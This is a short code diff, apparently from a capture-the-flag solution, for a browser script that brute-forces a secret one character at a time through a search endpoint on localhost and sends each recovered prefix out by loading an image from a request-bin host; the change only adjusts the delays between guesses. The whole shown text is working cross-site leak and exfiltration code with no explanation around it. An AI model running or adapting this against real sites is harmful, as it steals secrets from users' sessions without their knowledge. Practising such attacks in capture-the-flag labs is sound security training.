@@ -19,10 +19,8 @@
             await req(
               `http://localhost:8000/search?query=${query}`
             );
-            await setTimeout(() => {}, 500);
             return true;
         } catch (e) {
-            await setTimeout(() => {}, 500);
             return false;
         }
     }
@@ -33,6 +31,7 @@
 
         while (!secret.includes("}")) {
             for (let c of chars) {
+                await sleep(500);
                 if (await search(secret + c)) {
                     secret += c;
                     img.src = `https://${window.location.hash.slice(1)}.request.dreamhack.games/${secret}`;
